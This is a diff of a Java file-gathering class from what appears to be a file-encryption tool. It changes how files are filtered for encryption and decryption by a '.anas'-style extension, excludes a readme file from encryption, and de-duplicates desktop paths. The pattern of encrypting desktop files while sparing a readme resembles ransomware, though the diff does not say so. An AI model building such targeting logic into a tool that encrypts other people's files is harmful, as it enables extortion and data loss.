@@ -69,7 +69,7 @@ public class GetFiles {
                         break loo;
                 }
             }
-            if (isVerify && file.getName().endsWith(".anas")) {
+            if (isVerify && file.getName().endsWith(Constants.fileEncryptedExtension)) {
                 ArrayList<File> f = new ArrayList<>();
                 f.add(file);
                 return f;
@@ -80,12 +80,13 @@ public class GetFiles {
         // Filtration
         for (int j = 0; j < files.size(); j++) {
             File file = files.get(j);
-            if (to == To.DECRYPTION && !file.getName().endsWith(".anas")
-            || to == To.ENCRYPTION && file.getName().endsWith(".anas")) {
+            if (to == To.DECRYPTION && !file.getName().endsWith(Constants.fileEncryptedExtension)
+            || to == To.ENCRYPTION && (file.getName().endsWith(Constants.fileEncryptedExtension)
+            || file.getName().contains(Constants.readmeFileName.substring(0, Constants.readmeFileName.indexOf('e'))))) {
                 files.remove(j--);
                 continue;
             }
-            // Delete directories and can't write files and operation file
+            // Delete directories and can't write files and operation
             if (file.isDirectory() || !file.canWrite() || file.getName().equals(Constants.operationFileName))
                 files.remove(j--);
         }
@@ -97,6 +98,9 @@ public class GetFiles {
      * @return array list from desktops
      */
     public ArrayList<File> getDesktops() {
+        for (int i = 0; i < desktops.size() && desktops.size() > i + 1; i++)
+            if (desktops.get(i).getPath().equalsIgnoreCase(desktops.get(i + 1).getPath()))
+                desktops.remove(i);
         return desktops;
     }
 }
